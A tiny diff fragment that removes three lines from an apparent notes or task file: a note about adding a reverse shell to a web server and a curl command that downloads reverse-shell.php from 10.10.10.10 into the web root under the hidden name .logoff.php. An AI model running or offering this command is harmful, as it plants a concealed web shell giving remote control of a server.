@@ -1,3 +1,0 @@
-
-add reverse shell to /var/www/html/ from web server
-curl 10.10.10.10/reverse-shell.php -o /var/www/html/.logoff.php
